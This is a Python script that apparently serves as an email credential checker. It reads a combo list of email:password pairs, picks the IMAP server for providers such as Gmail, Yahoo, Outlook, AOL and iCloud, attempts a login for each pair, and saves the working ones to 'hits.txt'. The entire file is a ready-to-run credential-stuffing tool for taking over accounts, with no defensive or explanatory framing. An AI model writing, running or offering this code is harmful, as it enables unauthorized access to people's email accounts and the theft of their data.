import imaplib

def check_email_login(email, password):
    domain = email.split('@')[-1]
    
    # Identify IMAP server based on email domain
    imap_servers = {
        "gmail.com": "imap.gmail.com",
        "yahoo.com": "imap.mail.yahoo.com",
        "yahoo.co.uk": "imap.mail.yahoo.com",
        "hotmail.com": "outlook.office365.com",
        "live.com": "outlook.office365.com",
        "outlook.com": "outlook.office365.com",
        "aol.com": "imap.aol.com",
        "icloud.com": "imap.mail.me.com",
        "btinternet.com": "outlook.office365.com",  
    }

    if domain not in imap_servers:
        print(f"Unknown email provider for {email}. Skipping...")
        return False

    imap_host = imap_servers[domain]

    try:
        mail = imaplib.IMAP4_SSL(imap_host)
        mail.login(email, password)
        mail.logout()
        return True  # Login successful
    except imaplib.IMAP4.error:
        return False  # Login failed

def check_logins_from_file(file_path):
    with open(file_path, 'r') as file:
        logins = [line.strip().split(':') for line in file.readlines()]

    hits = []
    with open('hits.txt', 'w') as hits_file:
        for email, password in logins:
            if check_email_login(email, password):
                print(f"[SUCCESS] {email}:{password}")
                hits.append(f"{email}:{password}")
                hits_file.write(f"{email}:{password}\n")
            else:
                print(f"[FAILED] {email}")

def main():
    file_path = input('Enter the path to the .txt file containing logins (format: username:password): ')
    check_logins_from_file(file_path)

if __name__ == '__main__':
    main()
